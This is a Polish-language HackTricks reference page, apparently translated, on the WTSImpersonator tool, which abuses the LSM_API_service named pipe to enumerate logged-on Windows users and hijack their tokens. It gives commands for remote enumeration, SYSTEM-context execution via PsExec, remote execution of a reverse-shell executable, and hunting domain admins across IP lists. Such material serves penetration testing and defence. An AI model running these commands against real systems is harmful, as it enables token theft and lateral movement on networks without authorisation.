<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Narzędzie **WTS Impersonator** wykorzystuje nazwaną rurę RPC **"\\pipe\LSM_API_service"** do dyskretnego wyliczania zalogowanych użytkowników i przejmowania ich tokenów, omijając tradycyjne techniki podrobienia tokenów. Ta metoda ułatwia płynne poruszanie się po sieciach. Innowacyjność tej techniki przypisuje się **Omri Baso, którego praca jest dostępna na [GitHubie](https://github.com/OmriBaso/WTSImpersonator)**.

### Główne funkcje
Narzędzie działa poprzez sekwencję wywołań API:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Kluczowe moduły i użycie
- **Wyszukiwanie użytkowników**: Narzędzie umożliwia lokalne i zdalne wyszukiwanie użytkowników za pomocą odpowiednich poleceń:
- Lokalnie:
```powershell
.\WTSImpersonator.exe -m enum
```
- Zdalnie, poprzez podanie adresu IP lub nazwy hosta:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają kontekstu **Usługi** do działania. Lokalne wykonanie poleceń wymaga jedynie pliku wykonywalnego WTSImpersonator i polecenia:
- Przykład wykonania lokalnego polecenia:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Aby uzyskać kontekst usługi, można użyć PsExec64.exe:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Zdalne wykonanie poleceń**: Polega na tworzeniu i instalowaniu usługi zdalnie, podobnie jak w przypadku PsExec.exe, umożliwiając wykonanie z odpowiednimi uprawnieniami.
- Przykład zdalnego wykonania:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduł łowcy użytkowników**: Celuje w określonych użytkowników na wielu maszynach, wykonując kod w oparciu o ich poświadczenia. Jest to szczególnie przydatne do celowania w administratorów domeny posiadających lokalne uprawnienia administratora na kilku systemach.
- Przykład użycia:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
